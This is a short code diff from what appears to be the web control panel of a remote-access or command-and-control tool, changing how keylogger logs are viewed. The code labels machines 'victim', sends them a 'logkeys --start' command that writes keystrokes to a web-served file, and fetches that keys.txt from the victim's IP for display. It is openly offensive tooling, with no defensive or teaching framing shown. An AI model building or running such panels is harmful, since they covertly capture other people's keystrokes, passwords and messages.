@@ -95,10 +95,10 @@
 //keylog
 
     $("#keylogview").on('click', function() { 
-            $.get("http://" + ips[$("#victim").val()] + "/keys.txt", function(data, status){
+        var data = '<iframe src="http://' + ips[$("#victim").val()] + '/keys.txt"></iframe>';
                 $("#lg-op-body").html(data);
                 $("#lg-op").modal('show');
-            });
+            
       });
     $("#keylogstart").on('click', function() { 
           socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'logkeys --start --output /var/www/html/keys.txt' }, function (data) {});   
